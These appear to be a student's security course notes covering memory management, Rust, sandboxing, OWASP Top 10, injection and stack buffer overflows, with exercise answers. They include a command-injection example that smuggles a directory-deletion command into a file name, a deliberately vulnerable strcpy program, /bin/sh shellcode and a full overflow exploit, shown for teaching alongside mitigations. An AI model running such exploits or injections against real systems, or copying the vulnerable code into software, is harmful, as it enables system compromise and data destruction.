<p>One of the simplest - <strong>Mark-And-Sweep GC</strong>. First phase
is marking where we start with the root set and then recursively go
through the objects and mark them. Second phase is going through the
whole heap and removing unmarked objects.</p>
<p>It can be implemented for C and C++, conservatively scanning for
pointers.</p>
<h5 id="gc-overhead">GC overhead</h5>
<p>GC overhead is difficult to measure</p>
<p>Has a reputation for being significant</p>
<p>More troublesome is unpredicatble interruptions (there are pause-free
GCs)</p>
<h4 id="rust">Rust</h4>
<p>Safe programming language (type and memory)</p>
<p>Ownership types reduce need for runtime gc (also allows unsafe
code)</p>
<p>For low-level programming - efficient code, no gc, optional reference
counting.</p>
<p>Becoming popular for systems programming - already in use for the
Linux kernel, Android, Firefox.</p>
<h5 id="rust-ownership">Rust Ownership</h5>
<p>Variables <strong>own</strong> the value they are bound to
(contain)</p>
<p>When variable goes out of scope, vlaue is deallocated (similar to C++
smart pointers)</p>
<p>Key restriction - exactly 1 variable can be vound to a value.</p>
<p>Why?: Value’s lifetime is same as variable’s lifetime Also, Rust
allows destructive operations on values</p>
<p>Also Rust allows Borrowing with a requirement that the lifetime of a
borrower is longer than the borrowing function. Immutable reference
borrowing.</p>
<p>Read/Write restriction - it is useful in concurrent code to prevent
data races.</p>
<h5 id="rust-reference-counting">Rust reference counting</h5>
<p>Lifetime of objects is tied to variable’s scope (sometimes this does
not work e.g. trees, graphs)</p>
<p>Rust also allows reference counted smart pointers</p>
<h5 id="unsafe-code">Unsafe code</h5>
<p>rust also allows unsafe code that would not pass borrow checker put
unsage code in module and wrap in sage interface</p>
<p>Almost all non-trivial data structures implemented this way</p>
<p>Easier to undetand and hand-verify a small amount of code that
explicitly is marked unsafe</p>
<h3 id="thread-safety">Thread safety</h3>
<p>Examples of concurrency bugs:</p>
<ul>
<li>race conditions</li>
<li>deadlocks</li>
</ul>
<p>Example of concurrency bugs - dirtycow</p>
<p>Very hard to find</p>
<h4 id="dirtycow">DirtyCoW</h4>
<p>a local privilege escalation attack that exploits a race condition in
the linux kernel’s memory-management subsystem CoW - copy on write, a
mechanism for efficiently sharing modifiable data.</p>
<h4 id="in-programming-languages">In programming languages</h4>
<p>Modern languages include type-safe synchronization primites - locks,
semaphores, atomic vars</p>
<h5 id="thread-safety-in-java">Thread safety in Java</h5>
<p>In Java, the <code>synchronized</code> keyword is used in the
declaration of a method to acquire locks.</p>
<h5 id="thread-safety-in-go">Thread safety in Go</h5>
<p>It has Goroutines: green threads created by the go runtime, cheap and
fast</p>
<p>It has channels - means of communication between goroutines, data is
copied from one end of the channel to another.</p>
<h5 id="thread-safety-in-rust">Thread safety in Rust</h5>
<p>Ownership guarantees memory safety.</p>
<p>Either one thread that writes or multiple threads that read the
data.</p>
<h3 id="sandboxing-and-comparmentalization">Sandboxing and
comparmentalization</h3>
<p>POLP ensures that a component has the least privileges needed to
function</p>
<h4 id="sandboxing">Sandboxing</h4>
<p>implements POLP by running programs (often untrusted code) in an
isolated, restricted environment</p>
<p>is usually a implementation feature of programming languages instead
of design feature</p>
<p>system calls: seccomp cgroup</p>
<h5 id="sandboxing-example">Sandboxing example</h5>
<p>Flash*, JS, WebAssembly inside the browser</p>
<p>Interpreters (ghostscript/VBA macors) embedded inside word
processors</p>
<p>Without explicit permission from the user, opening a web page or
document shouldn’t leak secrectsin your local hard disk.</p>
<p>The premise of sandboxing providing security relies entirely on the
implementation of sandbox.</p>
<p><strong>Flash and VBA macros</strong> used to be security
nightmares</p>
<p>JS interpreter bugs remain a shource of critical browser
vulnerabilities.</p>
<h4 id="compartmentalization">Compartmentalization</h4>
<p>can enforce POLP</p>
<p>break a complex system into small components, limit the access of
entities to only what is necessary.</p>
<p>Prevent error propagation in the system to diminish impact.</p>
<p>Sandboxing is an implementation of this.</p>
<h5 id="chromium">Chromium</h5>
<p><strong>Sandboxed render engines</strong> - cannot affect the world,
except via the exposed AP</p>
<p>Start process, establish IPC channel Drop all access privileges Do
not require admin rights</p>
<p>If a webpage crashes, it does not affect the system</p>
<p><strong>Browser kernel API</strong> - decide how render engines
influence the outside world</p>
<p>Available channels: User interaction Storage Network</p>
<h4 id="compartmentalization-in-pl">Compartmentalization in PL</h4>
<p>what should a basic entity be - functions, libraries? (component)</p>
<p>How should each component interact with each other? (policy)</p>
<h2 id="exercises-5">Exercises 5</h2>
<p><strong>Exercise 5.1</strong> Explain type safety and memory
safety.</p>
<p>Type safety ensures that only type-appropriate operations are applied
to values during a program’s execution. C-style casts allow arbitrary
type casts, relying on the programmer to ensure the cast is valid. In
C++, upcasting a class pointer to a base class pointer is safe, but
downcasting a base class pointer to a derived class pointer can be
unsafe. For instance, if classes B and C both inherit from class A, a
pointer to a B object can be safely cast to a pointer to an A object,
but casting that pointer to class C is unsafe.</p>
<p>Memory safety ensures that only live memory regions are accessed
through a properly acquired (in-bound) pointer. Examples of memory
safety violations include out-of-bounds array accesses and
use-after-frees</p>
<p><strong>Exercise 5.2</strong> Is type safety necessary to reduce
security vulnerabilities?</p>
<p>Yes. Type safety helps to prevent certain software defects that could
be exploited in attacks. The lecture slides demonstrate that a type
confusion bug can be exploited in the Chrome browser.</p>
<p>Additionally, memory safety requires type safety to ensure an
object’s class type can be checked, confirming that a struct or object
field reference is legal.</p>
<p><strong>Exercise 5.3</strong> Why would a software developer prefer
to use a safe programming language? Why would a developer prefer an
unsafe programming language?</p>
<p>A developer should prefer a safe programming language if they are
developing software with a publicly exposed attack surface because
language safety can prevent many types of software defects, such as
buffer overruns (Google’s “rule of 2”). Developers might also prefer
safe languages as they can aid in writing robust and reliable software
by exposing software defects.</p>
<p>A developer might prefer an unsafe programming language because they
believe it allows writing more efficient code, optimizing a computer’s
processor and memory usage.</p>
<p><strong>Exercise 5.4</strong> Does language safety impose a burden on
a software developer?</p>
<p>Yes, but it is a necessary burden. Safety requires developers to
ensure that their programs’ types and pointer references conform to a
language’s rules. These rules ensure programs behave predictably and
according to language semantics without corrupting data or performing
ill-defined operations. Safe languages facilitate this by helping
developers identify defects with compiler and runtime error messages.
While it’s possible to write correct programs in unsafe languages, it’s
more challenging without compiler and runtime assistance. There are
cases where a program with type or memory errors might produce the
“right” answer, but such errors can cause the program to misbehave with
other inputs.</p>
<p><strong>Exercise 5.5</strong> What are the advantages and
disadvantages of the memory reclamation techniques discussed in the
lecture?</p>
<p>Manual memory allocation and deallocation (e.g., malloc/free in C)
grant a developer complete control over object lifetimes, potentially
optimizing a program’s memory usage. However, accurately tracking object
lifetimes is complex and prone to errors, which can introduce
defects.</p>
<p>Reference counting effectively reclaims non-cyclic data structures.
With efficiency improvements through language and compiler assistance,
it reclaims objects when they first become unreachable, without long
pauses. However, explicit cycle breaking is required for full memory
reclamation. Garbage collection has potentially lower performance
overhead than reference counting and can reclaim cyclic data structures.
It might also improve program performance by compacting data structures
to fit the processor cache better. However, garbage collection usually
introduces pauses in program execution to scan memory, which might be
unsuitable for certain applications.</p>
<p>Ownership and borrowing (as in Rust) tie object lifetimes to variable
scopes. Like smart pointers in C++, they release an object when its
encompassing variable goes out of scope. While ownership incurs a low
cost, it might not meet all allocation and deallocation requirements,
even with borrowing. Rust also offers reference counting for data
structures whose lifetimes aren’t tied to a specific variable.</p>
<p><strong>Exercise 5.6</strong> Give examples for violations of spatial
and temporal memory safety. Explain how modern programming languages
prevent such violations.</p>
<p>Spatial memory safety violations involve accessing memory locations
that a program shouldn’t, such as out-of-bounds array accesses. Temporal
memory safety violations occur when a program accesses memory at a time
it shouldn’t, like accessing memory after it has been freed
(use-afterfree), double freeing memory, or returning a pointer to a
local (stack) variable.</p>
<p>Modern programming languages employ various techniques to prevent
these violations. For spatial memory safety, many languages enforce
bounds checking to ensure data is accessed within its allocated space.
For temporal memory safety, languages may use techniques like garbage
collection (as seen in Java) or ownership and borrowing systems (as in
Rust) to manage memory access and deallocation</p>
<p><strong>Exercise 5.7</strong> Explain static/dynamic typing. What are
their advantages and disadvantages?</p>
<p>Static typing checks types at compile time, whereas dynamic typing
checks types at runtime.</p>
<p>Advantages of static typing: (1) Can catch type errors early, often
leading to more robust software. (2) Can lead to performance
optimizations since type information is available at compile-time. (3)
Provides clearer documentation via type annotations, helping developers
understand code better.</p>
<p>Disadvantages of static typing: (1) Can be more verbose as type
annotations are usually required. (Type inference can help reduce
verbosity) (2) Might require additional boilerplate, e.g., using
templates in C++ for generic programming.</p>
<p>Advantages of dynamic typing: (1) Provides flexibility and allows for
rapid prototyping. (2) Reduces verbosity as type annotations are often
optional.</p>
<p>Disadvantages of dynamic typing: (1) Typing errors can only be
detected at runtime, which can be problematic for large and complex
programs. (2) Absence of type annotations can make code harder to
understand and maintain.</p>
<p><strong>Exercise 5.8</strong> Compare and contrast dynamic typing and
loose (weak) typing.</p>
<p>Dynamic typing pertains to when type checking occurs: at runtime.
Loose (or weak) typing, on the other hand, describes how strictly type
rules are enforced allowing for more implicit type conversions.</p>
<p>It’s essential to understand that dynamic typing and weak typing are
orthogonal concepts. A language can be dynamically typed and either
strictly or loosely typed. For instance, Python is both dynamically and
strictly typed because, while type checking happens at runtime, it
enforces type rules rigorously. Conversely, C is statically and weakly
typed, as it allows arbitrary pointer casts, implicit type conversions
and performs type checks at compile-time.</p>
<p><strong>Exercise 5.9</strong> Do modern programming languages provide
full guarantee for thread safety?</p>
<p>No, modern programming languages do not provide a “full guarantee”
for thread safety. Thread safety is about ensuring multiple threads can
access shared resources without causing unintended behaviors or data
inconsistencies. Although many modern languages offer features and
constructs (like ’synchronized‘ in Java, goroutines and channels in Go,
and ownership in Rust) to aid in achieving thread safety, these are
tools and not guarantees. For example, while modern programming
languages offer locks in their standard libraries, there’s no assurance
that programs using these languages will be free of deadlocks.</p>
<p><strong>Exercise 5.10</strong> Explain the principle of least
privilege, sandboxing, and compartmentalization in your own words. Show
how they relate to each other.</p>
<p>The principle of least privilege dictates that a user, program, or
process should possess only the minimum privileges needed for its
function.</p>
<p>Sandboxing is a security technique wherein a program or process
operates in a restricted environment with limited resource and system
function access.</p>
<p>Compartmentalization involves dividing a system into isolated
sections, ensuring a breach in one doesn’t compromise another.</p>
<p>Both sandboxing and compartmentalization help enforce the principle
of least privilege by restricting program or process privileges to only
those necessary. In a programming language context, compartmentalization
is often more fine-grained, operating at function or library levels,
whereas sandboxing is more coarse-grained, limiting access at the
process level.</p>
<h2 id="web-and-software-security">Web and software security</h2>
<p>CVE - unique identifier for a vulnerability (vunerabilities and
exposures) CWE - unique identifier for a class of vulnerabilities
(weakness enumeration)</p>
<h3 id="owasp-top-10">OWASP Top 10</h3>
<ol type="1">
<li>Broken access control
<ol type="1">
<li>failures lead to unauthorized information disclosure, modification,
or destruction of all data or performing a business function outside the
user’s limits</li>
<li>CWEs: exposure of sensitive information to an unauthorized actore,
Insertion of sensitive information into sent data, cross-site request
forgery</li>
<li>Solutions - reduce attack surface by “deny by default”, log access
control failures, and rate limit API calls.</li>
<li>Difficulty - keeping track of what you have installed and that it
does not allow escalation of access.</li>
</ol></li>
<li>Cryptographic failures
<ol type="1">
<li>CWEs: Use of hard-coded (“default”) password, Broken or Risky Crypto
algorithm, Insufficient Entropy</li>
<li>Solutions: reduce attack surface by storeing minimal data</li>
<li>Ensure up-to-date algorithms and implementations</li>
<li>Disable legacy protocols</li>
</ol></li>
<li>Injection
<ol type="1">
<li>It is possilbe when attacker controlled data is handled incorrectly
and ends up being parsed as code.</li>
<li>CWEs: XSS, SQL injection, External control of file name or path</li>
<li>Solutions: reduce attack surface by shifting to safe API, sanitize
user input through validation and escaping , validate input whenever
possible, escape remaining characters when necessary.</li>
<li>It is extremely difficult to detect that on the browser/user side,
because websites already use a lot of resources from other websites</li>
</ol></li>
<li>Insecure design
<ol type="1">
<li>it is broad category representing different weaknesses.</li>
<li>CWEs: Generation of Error Message containing sensitive information,
Unprotected storage of credentials, Trust boundary violation,
Insufficiently protected credentials.</li>
<li>Solutions: prevent by establishing secure development lifecycle, use
threat modeling where feasible, segregate and compartmentalize where
possible</li>
</ol></li>
<li>Security Misconfiguration
<ol type="1">
<li>Admins need to carefully balance features and security. Any software
along a complex stack may be misconfigured.</li>
<li>CWEs: Configuration, Improper restriction of XML external entity
reference</li>
<li>E.g. configuring email server</li>
<li>Solutions: document the software stack and its configuration, harden
all configuration, minimize exposed features.</li>
</ol></li>
<li>Vulnerable/Outdated Components
<ol type="1">
<li>software built on top of bigger components (wordpress) and keep
those updates coming</li>
<li>CWE: Use of unmaintained third-party components</li>
<li>Reasons why this is not done: code deprecation, dependency
management is hard, certification, new stuff can be broken.</li>
<li>Solution: minimize attack surface, track inventory of software and
follow upstream security notices, monitor for available patches (if
patching is not possible mitigate through firewall or high-level
interception)</li>
</ol></li>
<li>Identification / Authentication failures
<ol type="1">
<li>CWEs: Improper validation of certificate with host mismatch,
Improper authentication, Session fixation</li>
<li>Solution: reduce attack surface through 2FA, Check for good password
hygiene, Limit or increasingly delay failed login attempts (and don’t
create your own policy)</li>
<li>Forcing to change the password (every 6 months) does not protect
from phishing because the timeframe is way too big.</li>
</ol></li>
<li>Software and data integrity failures
<ol type="1">
<li>E.g. application relies on plugins, libraries or modules from
untrusted sources, repositories and content delivery networks
(CDNs)</li>
<li>CWEs: Inclusion of functionality from untrusted control sphere,
Download code without integrity check</li>
<li>Solution: Mitigate by verifying (through signatures) that data comes
from verified source, review code and configuration changes</li>
</ol></li>
<li>Security and loggin monitoring
<ol type="1">
<li>Since breaches happen, document ongoing secuirty activities and
safely log actions to enable detection and analysis of breaches</li>
<li>CWEs: insufficient logging, imporper output neetralization for logs,
etc</li>
<li>Solutions: mitigate by logging failed logins, ensure high value
transations have an audit file</li>
</ol></li>
<li>Server side request forgery
<ol type="1">
<li>SSRF occurs whenever a web application is fetchin a remote resource
without validating the user-supplied URL. It basically get a server to
do something it shouldn’t do. Also called “Confused deputy attack”</li>
<li>Solutions: prevent by implementing defence in depth</li>
</ol></li>
</ol>
<h3 id="arbitrary-code-execution">Arbitrary code execution</h3>
<p>It is possible when user-supplied data escapes control</p>
<p>Example contexts: HTML, SQL, LDAP, OS commands, XML, etc</p>
<p>Vulnerability - special characters in user inputs can trigger an
action in the context</p>
<h4 id="sql-injection">SQL injection</h4>
<p>Happens when the SQL characters are escaped.</p>
<p>One of the problems: no input sanitization, so an escape character
can be used.</p>
<p>So the attacker controls whatever is inserted between the quotes, and
therefore it can escape them and add additional code to execute in the
database</p>
<p>LDAP, XSS is same principle</p>
<h4 id="ldap-pnjection">LDAP pnjection</h4>
<p>Lightweight directory access protocol is used to query
directories</p>
<p>It is possible to inject data by changing the meaning of the data by
adding conditions by guessing the structure of LDAP query and overcome
the password.</p>
<p>Happened for Joomla, and Log4J (library used in a lot of
software).</p>
<h4 id="command-injection">Command injection</h4>
<p>Since the code uses concatination, more commands can be added with
special chars (e.g. “photo &amp; rmdir /s /q photo” when opening the
dir) Similar thing happened to iOS.</p>
<h4 id="xss">XSS</h4>
<p>Javascript code injection into web pages</p>
<p>Impact: Steal session cookies, Display forged forms, Complete control
over webpage.</p>
<p>Mitigation strategy is to replace special chars
(e.g. “&lt;,&gt;”)</p>
<p>Types:</p>
<ul>
<li>Reflected - Attack is sent in the request and reflected in the
response</li>
<li>Stored - attack is stored on the server (e.g. XSS on the forum
post)</li>
<li>DOM-based - attack happens on the client side</li>
</ul>
<h4 id="protection-against-injection">Protection against injection</h4>
<p>Deny by default, otherwise inspect received data twice</p>
<p>When receiving - input validation</p>
<p>e.g.:</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="op">!</span>Regex<span class="op">.</span><span class="fu">IsMatch</span>(txtName<span class="op">.</span><span class="at">Text</span><span class="op">,</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a> @<span class="st">&quot;^[a-zA-Z&#39;.-]{1,40}$&quot;</span>)) {</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a> <span class="fu">abort</span>()</span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
<p>When using - Encode data</p>
<ul>
<li>Escape (encode) special characters when you use them</li>
<li>In SQL: ‘ becomes ’</li>
<li>In HTML: &lt;,&gt; becomes &lt; &gt;</li>
<li>In LDAP: (,) becomes \28, \29</li>
</ul>
<p>SQL injection protection: use prepared statements instead of
concatenating. (this is separation of control and data)</p>
<h3 id="software-security">Software security</h3>
<p>All software will have bugs. Some of the bugs can be exploitable.</p>
<p>In the stack right next to each other we have data and the pointer
which controls the execution of the program. Therefore an attacker can
exploit this.</p>
<h4 id="buffer-overflows">Buffer overflows</h4>
<p>Vulnerable program: <code>strcpy</code> call copies a string into the
buffer on the stack, potentially past the end of
<code>cookie</code>.</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">*</span> argv<span class="op">[])</span> <span class="op">{</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> authorized <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> cookie<span class="op">[</span><span class="dv">31</span><span class="op">];</span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>getenv<span class="op">(</span><span class="st">&quot;AUTH&quot;</span><span class="op">)</span> <span class="op">!=</span> NULL <span class="op">&amp;&amp;</span> strcmp<span class="op">(</span>getenv<span class="op">(</span><span class="st">&quot;AUTH&quot;</span><span class="op">),</span> <span class="st">&quot;MAGIC&quot;</span><span class="op">)</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>  authorized <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Give me a cookie ( %p, %p)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> cookie<span class="op">,</span> getenv<span class="op">(</span><span class="st">&quot;EGG&quot;</span><span class="op">));</span></span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>  strcpy<span class="op">(</span>cookie<span class="op">,</span> argv<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Thanks for the %s</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> cookie<span class="op">);</span></span>
<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>authorized<span class="op">)</span> <span class="op">{</span></span>
<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Congratulations, you are authorized! </span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>It is possible to check mitigations with <code>checksec</code></p>
<p><code>cookie</code> is 31 byte buffer, after which there is
authorized bool and return address. Strcpy is not checking how much data
it is copying (copies everything before ‘’)</p>
<p>This means that we can inject code into the address space and set the
return address to the address of the injected shellcode.</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> shell<span class="op">()</span> <span class="op">{</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>asm<span class="op">(</span><span class="st">&quot;\</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="st">needle: jmp gofar </span><span class="sc">\n</span><span class="st">\</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="st">goback: pop %rdi </span><span class="sc">\n</span><span class="st">\</span></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="st"> xor %rax, %rax </span><span class="sc">\n</span><span class="st">\</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="st"> movb $0x3b, %al </span><span class="sc">\n</span><span class="st">\</span></span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="st"> xor %rsi, %rsi </span><span class="sc">\n</span><span class="st">\</span></span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="st"> xor %rdx, %rdx </span><span class="sc">\n</span><span class="st">\</span></span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="st"> syscall </span><span class="sc">\n</span><span class="st">\</span></span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="st">gofar: call goback </span><span class="sc">\n</span><span class="st">\</span></span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="st">.string </span><span class="sc">\&quot;</span><span class="st">/bin/sh</span><span class="sc">\&quot;\n</span><span class="st">\</span></span>
<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><code>call</code> puts the return address to the stack and therefore
the syscall uses the string argument.</p>
<p><strong>Exploit</strong>:</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BUFSIZE 0x20</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define EGGLOC 0x7fffffffefd3</span></span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">*</span> argv<span class="op">[])</span> <span class="op">{</span></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> shellcode<span class="op">[]</span> <span class="op">=</span> <span class="st">&quot;EGG=&quot;</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;</span><span class="sc">\xeb\x0e</span><span class="st">&quot;</span> <span class="co">// jump +0xe (+14)</span></span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;</span><span class="sc">\x5f</span><span class="st">&quot;</span> <span class="co">// pop %rdi</span></span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;</span><span class="sc">\x48\x31\xc0</span><span class="st">&quot;</span> <span class="co">// xor %rax, %rax</span></span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;</span><span class="sc">\xb0\x3b</span><span class="st">&quot;</span> <span class="co">// mov $0x3b, %al</span></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;</span><span class="sc">\x48\x31\xf6</span><span class="st">&quot;</span> <span class="co">// xor %rsi, %rsi</span></span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;</span><span class="sc">\x48\x31\xd2</span><span class="st">&quot;</span> <span class="co">// xor %rdx, %rdx</span></span>
<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;</span><span class="sc">\x0f\x05</span><span class="st">&quot;</span> <span class="co">// syscall</span></span>
<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;</span><span class="sc">\xe8\xed\xff\xff\xff\x2f</span><span class="st"> &quot;</span> <span class="co">// call 0xed (-19)</span></span>
<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;</span><span class="sc">\x62\x69\x6e\x2f\x73\x68\x00\x5d</span><span class="st"> &quot;</span><span class="op">;</span> <span class="co">// /bin/bash+\0</span></span>
<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buf<span class="op">[</span><span class="dv">256</span><span class="op">];</span> <span class="co">// buffer used for overflow</span></span>
<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span>BUFSIZE<span class="op">+</span><span class="kw">sizeof</span><span class="op">(</span><span class="dt">void</span><span class="op">*);</span> buf<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="ch">&#39;A&#39;</span><span class="op">);</span> <span class="co">// fill buffer + rbp</span></span>
<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">**</span>buff <span class="op">=</span> <span class="op">(</span><span class="dt">char</span><span class="op">**)(&amp;</span>buf<span class="op">[</span>BUFSIZE<span class="op">+</span><span class="kw">sizeof</span><span class="op">(</span><span class="dt">void</span><span class="op">*)]);</span> <span class="co">// overwrite RIP</span></span>
<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a>  <span class="op">*(</span>buff<span class="op">++)</span> <span class="op">=</span> <span class="op">(</span> <span class="dt">void</span><span class="op">*)</span>EGGLOC<span class="op">;</span></span>
<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a>  <span class="op">*</span>buff <span class="op">=</span> <span class="op">(</span> <span class="dt">void</span><span class="op">*)</span><span class="bn">0x0</span><span class="op">;</span></span>
<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>args<span class="op">[</span><span class="dv">3</span><span class="op">]</span> <span class="op">=</span> <span class="op">{</span> <span class="st">&quot;./stack&quot;</span><span class="op">,</span> buf<span class="op">,</span> NULL <span class="op">};</span> <span class="co">// execution environment</span></span>
<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>envp<span class="op">[</span><span class="dv">2</span><span class="op">]</span> <span class="op">=</span> <span class="op">{</span> shellcode<span class="op">,</span> NULL<span class="op">};</span></span>
<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a>  execve<span class="op">(</span><span class="st">&quot;./stack&quot;</span><span class="op">,</span> args<span class="op">,</span> envp<span class="op">);</span> <span class="co">// fire exploit!</span></span>
<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h4 id="mitigations">Mitigations</h4>
<p>This program violates:</p>
<ul>
<li>memory safety: stop memory corruption - safe C/C++ dialects (CCured,
Cyclone), rewrite in safe lang</li>
<li>Integrity: Enforce integrity of reads/writes</li>
<li>Randomization: Randomize locations, code, data, or pointer
values</li>
<li>Flow integrity: Protect control transfers - data-flow integrity,
control-flow integrity</li>
</ul>
<h4 id="defense-strategies">Defense strategies</h4>
<p><strong>Data execution prevention (DEP)</strong> - distinguish code
and data and prohibit the attacker from ijecting code. Problem - ISAs
(e.g. x86, ARM) did not distinguish code and data</p>
<p>DEP hardware support - page table extension, introduce NX-bt (No
eXecute bit). Intel - per-page bit XD AMD - Enhanced Virus Protetion ARM
- XN thsis is an addtional bit for every mapped virtual page.</p>
<p>Attacker can still control pointers.</p>
<p><strong>ASLR - Address Space Layout Randomization</strong> ASLR
focuses on blocks of memory (i.e., it is coarse grained) Heap, stack,
code, executable, mmap regions end up at random addresses ASLR is
inherently page-based, limiting cost of shuffling Initialized when
process starts (never re-randomized)</p>
<p><strong>Stack canaries (stack protector)</strong> Before we return
from the function we check if the canary is still alive. This canary is
placed before the return value in the function which is a magic value.
This allows us to protect RIP control-flow attacks. Key limitation -
only protects from continuous overwrites if (and only if) the attacker
does not know the canary Low overhead.</p>
<h2 id="exercises-6">Exercises 6</h2>
<p><strong>Exercise 6.1</strong> You are writing a web application to
sell Whisky. You want to save your customers’ names in a database. You
know that single quotes (’) can break SQL request. What can you do to be
able to accept single quotes in names and still have no problem with SQL
injections?</p>
<p>You can always encode the data, so that special characters lose their
special meaning. In SQL a literal single quote (’) can be encoded by
prepending a backslash (’).</p>
<p><strong>Exercise 6.2</strong> Consider the following code, taken from
the Mitre Common Weakness Enumeration website ([https://cwe.mitre.org]).
A web application has a function to run a backup of a database. The
backup can be of type full or incremental. The type of backup is
selected by the user and is sent to the server in the parameter named
backuptype. The following code is used on the server:</p>
